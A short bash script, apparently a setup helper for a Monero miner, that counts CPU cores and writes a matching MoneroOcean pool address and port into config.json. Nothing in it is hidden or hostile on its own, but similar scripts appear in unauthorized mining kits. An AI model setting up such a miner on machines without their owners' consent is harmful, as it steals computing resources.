#!/bin/bash
# a == ncpu
a=`nproc --all`
if [ $a -le 2 ]
then 
sed -i "s/\"url\": \"null\"/\"url\": \"gulf.moneroocean.stream:10001\"/g" config.json 
elif [ $a -le 4 ] 
then 
sed -i "s/\"url\": \"null\"/\"url\": \"gulf.moneroocean.stream:10002\"/g" config.json 
elif [ $a -le 8 ]
then 
sed -i "s/\"url\": \"null\"/\"url\": \"gulf.moneroocean.stream:10004\"/g" config.json 
elif [ $a -gt 8 ]
then 
sed -i "s/\"url\": \"null\"/\"url\": \"gulf.moneroocean.stream:10008\"/g" config.json 
fi
